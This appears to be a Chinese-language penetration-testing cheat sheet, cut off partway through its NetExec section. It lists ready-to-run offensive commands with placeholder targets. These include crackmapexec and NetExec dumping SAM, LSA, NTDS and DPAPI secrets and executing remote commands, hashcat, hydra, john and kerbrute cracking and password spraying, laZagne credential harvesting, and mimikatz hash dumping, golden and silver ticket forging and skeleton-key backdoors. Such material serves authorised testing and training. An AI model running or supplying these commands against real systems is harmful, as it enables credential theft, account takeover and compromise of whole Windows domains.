<h4 id="SQL截断攻击"><a href="#SQL截断攻击" class="headerlink" title="SQL截断攻击"></a>SQL截断攻击</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27;admin@&lt;FQDN&gt;&#x27;</span> = <span class="hljs-string">&#x27;admin@&lt;FQDN&gt;++++++++++++++++++++++++++++++++++++++htb&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="sqlite3数据库"><a href="#sqlite3数据库" class="headerlink" title="sqlite3数据库"></a>sqlite3数据库</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sqlite3 &lt;FILE&gt;.db<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">sqlite&gt; .tables<br>sqlite&gt; PRAGMA <span class="hljs-title function_">table_info</span><span class="hljs-params">(&lt;TABLE&gt;)</span>;<br>sqlite&gt; SELECT * FROM &lt;TABLE&gt;;<br></code></pre></td></tr></table></figure>

<h4 id="sqsh工具"><a href="#sqsh工具" class="headerlink" title="sqsh工具"></a>sqsh工具</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">sqsh -S <span class="hljs-tag">&lt;<span class="hljs-name">RHOST</span>&gt;</span> -U <span class="hljs-tag">&lt;<span class="hljs-name">USERNAME</span>&gt;</span><br>sqsh -S &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">RHOST</span>&gt;</span>&#x27; -U &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">USERNAME</span>&gt;</span>&#x27; -P &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">PASSWORD</span>&gt;</span>&#x27;<br>sqsh -S &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">RHOST</span>&gt;</span>&#x27; -U &#x27;.\<span class="hljs-tag">&lt;<span class="hljs-name">USERNAME</span>&gt;</span>&#x27; -P &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">PASSWORD</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure>

<h5 id="使用-xp-dirtree-列出文件和文件夹"><a href="#使用-xp-dirtree-列出文件和文件夹" class="headerlink" title="使用 xp_dirtree 列出文件和文件夹"></a>使用 xp_dirtree 列出文件和文件夹</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">EXEC master.sys.xp_dirtree N<span class="hljs-number">&#x27;</span>C:\inetpub\wwwroot\<span class="hljs-string">&#x27;,1,1;</span><br></code></pre></td></tr></table></figure>

<h3 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h3><h4 id="CRACKMAPEXEC"><a href="#CRACKMAPEXEC" class="headerlink" title="CRACKMAPEXEC"></a>CRACKMAPEXEC</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">crackmapexec ldap -L<br>crackmapexec mysql -L<br>crackmapexec smb -L<br>crackmapexec ssh -L<br>crackmapexec winrm -L<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">crackmapexec smb &lt;RHOST&gt; -u <span class="hljs-string">&#x27;&#x27; -p &#x27;</span><span class="hljs-string">&#x27; --shares</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &#x27;</span><span class="hljs-string">&#x27; -p &#x27;</span><span class="hljs-string">&#x27; --shares -M spider_plus</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &#x27;</span><span class="hljs-string">&#x27; -p &#x27;</span><span class="hljs-string">&#x27; --shares -M spider_plus -o READ_ONLY=false</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot; &quot; -p &quot;&quot; --shares</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot; &quot; -p &quot;&quot; --shares -M spider_plus</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot; &quot; -p &quot;&quot; --shares -M spider_plus -o READ_ONLY=false</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u guest -p &#x27;</span><span class="hljs-string">&#x27; --shares --rid-brute</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u guest -p &#x27;</span><span class="hljs-string">&#x27; --shares --rid-brute 100000</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;guest&quot; -p &quot;&quot; --shares --rid-brute</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;guest&quot; -p &quot;&quot; --shares --rid-brute 100000</span><br><span class="hljs-string">crackmapexec ldap &lt;RHOST&gt; -u &#x27;</span><span class="hljs-string">&#x27; -p &#x27;</span><span class="hljs-string">&#x27; -M get-desc-users</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; --use-kcache --sam</span><br><span class="hljs-string">crackmapexec ldap &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --gmsa</span><br><span class="hljs-string">crackmapexec ldap &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --gmsa -k</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --shares</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --sam</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --lsa</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --dpapi</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --local-auth --sam</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --local-auth --lsa</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --local-auth --dpapi</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; -M lsassy</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --ntds</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -H &quot;&lt;NTLMHASH&gt;&quot; --ntds</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --ntds --user &lt;USERNAME&gt;</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -H &quot;&lt;NTLMHASH&gt;&quot; --ntds --user &lt;USERNAME&gt;</span><br><span class="hljs-string">crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -H &lt;HASH&gt; -x &quot;whoami&quot;</span><br><span class="hljs-string">crackmapexec winrm &lt;SUBNET&gt;/24 -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; -d .</span><br><span class="hljs-string">crackmapexec winrm -u /t -p &quot;&lt;PASSWORD&gt;&quot; -d &lt;DOMAIN&gt; &lt;RHOST&gt;</span><br><span class="hljs-string">crackmapexec winrm &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt</span><br><span class="hljs-string">crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares</span><br><span class="hljs-string">crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol</span><br><span class="hljs-string">crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers</span><br><span class="hljs-string">crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam</span><br><span class="hljs-string">crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x &#x27;</span>net user Administrator /domain<span class="hljs-number">&#x27;</span> --exec-method smbexec<br>crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable<br>crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x <span class="hljs-string">&#x27;quser&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="FCRACK-工具"><a href="#FCRACK-工具" class="headerlink" title="FCRACK 工具"></a>FCRACK 工具</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt &lt;FILE&gt;.zip<br></code></pre></td></tr></table></figure>

<h4 id="组策略首选项-GPP"><a href="#组策略首选项-GPP" class="headerlink" title="组策略首选项 (GPP)"></a>组策略首选项 (GPP)</h4><h5 id="GPP解密"><a href="#GPP解密" class="headerlink" title="GPP解密"></a>GPP解密</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">python3 gpp-decrypt.py -f Groups.xml<br>python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<br></code></pre></td></tr></table></figure>

<h4 id="哈希猫-HASHCAT"><a href="#哈希猫-HASHCAT" class="headerlink" title="哈希猫 - HASHCAT"></a>哈希猫 - HASHCAT</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=hashcat">https://hashcat.net/wiki/doku.php?id=hashcat</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://hashcat.net/cap2hashcat/">https://hashcat.net/cap2hashcat/</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">hashcat --example-hashes<br>hashcat --help | grep -i <span class="hljs-string">&quot;ntlm&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">hashcat -m <span class="hljs-number">0</span> md5 /usr/share/wordlists/rockyou.txt<br>hashcat -m <span class="hljs-number">100</span> sha<span class="hljs-number">-1</span> /usr/share/wordlists/rockyou.txt<br>hashcat -m <span class="hljs-number">1400</span> sha256 /usr/share/wordlists/rockyou.txt<br>hashcat -m <span class="hljs-number">3200</span> bcrypt /usr/share/wordlists/rockyou.txt<br>hashcat -m <span class="hljs-number">900</span> md4 /usr/share/wordlists/rockyou.txt<br>hashcat -m <span class="hljs-number">1000</span> ntlm /usr/share/wordlists/rockyou.txt<br>hashcat -m <span class="hljs-number">1800</span> sha512 /usr/share/wordlists/rockyou.txt<br>hashcat -m <span class="hljs-number">160</span> hmac-sha1 /usr/share/wordlists/rockyou.txt<br>hashcat -a <span class="hljs-number">0</span> -m <span class="hljs-number">0</span> hash.txt SecLists/Passwords/xato-net<span class="hljs-number">-10</span>-million-passwords<span class="hljs-number">-1000000.</span>txt -O --force<br>hashcat -O -m <span class="hljs-number">500</span> -a <span class="hljs-number">3</span> <span class="hljs-number">-1</span> ?l <span class="hljs-number">-2</span> ?d <span class="hljs-number">-3</span> ?u  --force hash.txt ?<span class="hljs-number">3</span>?<span class="hljs-number">3</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">2</span>?<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>

<h5 id="破解-ASPREPRoast-密码文件"><a href="#破解-ASPREPRoast-密码文件" class="headerlink" title="破解 ASPREPRoast 密码文件"></a>破解 ASPREPRoast 密码文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hashcat -m <span class="hljs-number">18200</span> -a <span class="hljs-number">0</span> &lt;FILE&gt; &lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="破解-Kerberoasting-密码文件"><a href="#破解-Kerberoasting-密码文件" class="headerlink" title="破解 Kerberoasting 密码文件"></a>破解 Kerberoasting 密码文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hashcat -m <span class="hljs-number">13100</span> --force &lt;FILE&gt; &lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="基于模式的暴力破解"><a href="#基于模式的暴力破解" class="headerlink" title="基于模式的暴力破解"></a>基于模式的暴力破解</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --<span class="hljs-built_in">stdout</span><br></code></pre></td></tr></table></figure>

<h5 id="生成候选密码：单词列表-模式"><a href="#生成候选密码：单词列表-模式" class="headerlink" title="生成候选密码：单词列表+模式"></a>生成候选密码：单词列表+模式</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hashcat -a6 -m0 <span class="hljs-string">&quot;e99a18c428cb38d5f260853678922e03&quot;</span> yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --<span class="hljs-built_in">stdout</span><br></code></pre></td></tr></table></figure>

<h5 id="使用internalMonologue生成NetNLTMv2并使用hashcat破解"><a href="#使用internalMonologue生成NetNLTMv2并使用hashcat破解" class="headerlink" title="使用internalMonologue生成NetNLTMv2并使用hashcat破解"></a>使用internalMonologue生成NetNLTMv2并使用hashcat破解</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange <span class="hljs-number">002233445566778888800</span><br></code></pre></td></tr></table></figure>
<h6 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">spotless::WS01:<span class="hljs-number">1122334455667788</span>:<span class="hljs-number">26872b</span>3197acf1da493228ac1a54c67c:<span class="hljs-number">010100000000000078b</span>063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000<br></code></pre></td></tr></table></figure>

<h5 id="用hashcat破解"><a href="#用hashcat破解" class="headerlink" title="用hashcat破解"></a>用hashcat破解</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hashcat -m5600 <span class="hljs-string">&#x27;spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000&#x27;</span> -a <span class="hljs-number">3</span> /usr/share/wordlists/rockyou.txt --force --potfile-disable<br></code></pre></td></tr></table></figure>

<h5 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h5><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule">https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule</a></p>
</blockquote>
<h5 id="使用-OneRuleToRuleThemAll-rule-进行破解"><a href="#使用-OneRuleToRuleThemAll-rule-进行破解" class="headerlink" title="使用 OneRuleToRuleThemAll.rule 进行破解"></a>使用 OneRuleToRuleThemAll.rule 进行破解</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hashcat -m <span class="hljs-number">3200</span> hash.txt -r /PATH/TO/FILE.rule<br></code></pre></td></tr></table></figure>

<h4 id="九头蛇-hydra"><a href="#九头蛇-hydra" class="headerlink" title="九头蛇 - hydra"></a>九头蛇 - hydra</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra &lt;RHOST&gt; -l &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;PROTOCOL&gt;<br>hydra &lt;RHOST&gt; -L /PATH/TO/WORDLIST/&lt;FILE&gt; -P /PATH/TO/WORDLIST/&lt;FILE&gt; &lt;PROTOCOL&gt;<br>hydra &lt;RHOST&gt; -C /PATH/TO/WORDLIST/&lt;FILE&gt; ftp<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">export HYDRA_PROXY=connect:<span class="hljs-comment">//127.0.0.1:8080</span><br>unset HYDRA_PROXY<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra &lt;RHOST&gt; -l &lt;USERNAME&gt; -P /PATH/TO/WORDLIST/&lt;FILE&gt; http-post-form <span class="hljs-string">&quot;/admin.php:username=^USER^&amp;password=^PASS^:login_error&quot;</span><br><br>hydra &lt;RHOST&gt; -l &lt;USERNAME&gt; -P /PATH/TO/WORDLIST/&lt;FILE&gt; http-post-form <span class="hljs-string">&quot;/index.php:username=user&amp;password=^PASS^:Login failed. Invalid&quot;</span><br><br>hydra &lt;RHOST&gt; -L /PATH/TO/WORDLIST/&lt;FILE&gt; -P /PATH/TO/WORDLIST/&lt;FILE&gt; http-post-form <span class="hljs-string">&quot;/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage&quot;</span> -s &lt;RPORT&gt;<br><br>hydra &lt;RHOST&gt; -l root@localhost -P otrs-cewl.txt http-form-post <span class="hljs-string">&quot;/otrs/index.pl:Action=Login&amp;RequestedURL=Action=Admin&amp;User=root@localhost&amp;Password=^PASS^:Login failed&quot;</span> -vV -f<br><br>hydra &lt;RHOST&gt; -l admin -P /PATH/TO/WORDLIST/&lt;FILE&gt; http-post-form <span class="hljs-string">&quot;/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&amp;__EVENTVALIDATION=COOKIE_2&amp;UserName=^USER^&amp;Password=^PASS^&amp;LoginButton=Log+in:Login failed&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="约翰-john"><a href="#约翰-john" class="headerlink" title="约翰 - john"></a>约翰 - john</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">/usr/share/john/ssh2john.py id_rsa &gt; hash<br>john hash --wordlist=/usr/share/wordlists/rockyou.txt &lt;FILE&gt;<br>john --rules --wordlist=/usr/share/wordlists/rockyou.txt &lt;FILE&gt;<br>john --show &lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h4 id="kerbrute-域环境爆破工具"><a href="#kerbrute-域环境爆破工具" class="headerlink" title="kerbrute - 域环境爆破工具"></a>kerbrute - 域环境爆破工具</h4><h5 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./kerbrute userenum -d &lt;DOMAIN&gt; --dc &lt;DOMAIN&gt; /PATH/TO/FILE/&lt;USERNAMES&gt;<br></code></pre></td></tr></table></figure>

<h5 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./kerbrute passwordspray -d &lt;DOMAIN&gt; --dc &lt;DOMAIN&gt; /PATH/TO/FILE/&lt;USERNAMES&gt; &lt;PASSWORD&gt;<br></code></pre></td></tr></table></figure>

<h4 id="lazagne-exe"><a href="#lazagne-exe" class="headerlink" title="lazagne.exe"></a>lazagne.exe</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span><br></code></pre></td></tr></table></figure>

<h4 id="mimikatz-exe-猕猴桃"><a href="#mimikatz-exe-猕猴桃" class="headerlink" title="mimikatz.exe - 猕猴桃"></a>mimikatz.exe - 猕猴桃</h4><h5 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">token::elevate<br>token::revert<br>vault::cred<br>vault::<span class="hljs-built_in">list</span><br>lsadump::sam<br>lsadump::secrets<br>lsadump::cache<br>lsadump::dcsync /&lt;USERNAME&gt;:&lt;DOMAIN&gt;\krbtgt /domain:&lt;DOMAIN&gt;<br></code></pre></td></tr></table></figure>

<h5 id="转储-Hashes"><a href="#转储-Hashes" class="headerlink" title="转储 Hashes"></a>转储 Hashes</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">.\mimikatz.exe<br>sekurlsa::minidump /users/admin/Desktop/lsass.DMP<br>sekurlsa::LogonPasswords<br>meterpreter &gt; getprivs<br>meterpreter &gt; creds_all<br>meterpreter &gt; golden_ticket_create<br></code></pre></td></tr></table></figure>

<h5 id="制作白银票据"><a href="#制作白银票据" class="headerlink" title="制作白银票据"></a>制作白银票据</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">.\mimikatz.exe<br>sekurlsa::tickets /export<br>kerberos::ptt [<span class="hljs-number">0</span>;<span class="hljs-number">76126</span>]<span class="hljs-number">-2</span><span class="hljs-number">-0</span><span class="hljs-number">-40e10000</span>-Administrator@krbtgt-&lt;RHOST&gt;.LOCAL.kirbi<br>klist<br>dir \\&lt;RHOST&gt;\admin$<br></code></pre></td></tr></table></figure>

<h5 id="制作黄金票据"><a href="#制作黄金票据" class="headerlink" title="制作黄金票据"></a>制作黄金票据</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">.\mimikatz.exe<br>privilege::debug<br>lsadump::lsa /inject /name:krbtgt<br>kerberos::golden /user:Administrator /domain:controller.local /sid:S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-849420856</span><span class="hljs-number">-2351964222</span><span class="hljs-number">-986696166</span> /krbtgt:<span class="hljs-number">5508500012</span>cc005cf7082a9a89ebdfdf /id:<span class="hljs-number">500</span><br>misc::cmd<br>klist<br>dir \\&lt;RHOST&gt;\admin$<br></code></pre></td></tr></table></figure>

<h5 id="万能钥匙"><a href="#万能钥匙" class="headerlink" title="万能钥匙"></a>万能钥匙</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">privilege::debug<br>misc::skeleton<br>net use C:\\&lt;RHOST&gt;\admin$ /user:Administrator mimikatz<br>dir \\&lt;RHOST&gt;\c$ /user:&lt;USERNAME&gt; mimikatz<br></code></pre></td></tr></table></figure>

<h4 id="NetExec工具"><a href="#NetExec工具" class="headerlink" title="NetExec工具"></a>NetExec工具</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">netexec smb &lt;RHOST&gt; -u <span class="hljs-string">&#x27;&#x27; -p &#x27;</span><span class="hljs-string">&#x27; --shares</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &#x27;</span><span class="hljs-string">&#x27; -p &#x27;</span><span class="hljs-string">&#x27; --shares -M spider_plus</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &#x27;</span><span class="hljs-string">&#x27; -p &#x27;</span><span class="hljs-string">&#x27; --shares -M spider_plus -o READ_ONLY=false</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &#x27;</span><span class="hljs-string">&#x27; -p &#x27;</span><span class="hljs-string">&#x27; --shares -M spider_plus -o DOWNLOAD_FLAG=True</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &#x27;</span><span class="hljs-string">&#x27; -p &#x27;</span><span class="hljs-string">&#x27; --shares -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot; &quot; -p &quot;&quot; --shares</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot; &quot; -p &quot;&quot; --shares -M spider_plus</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot; &quot; 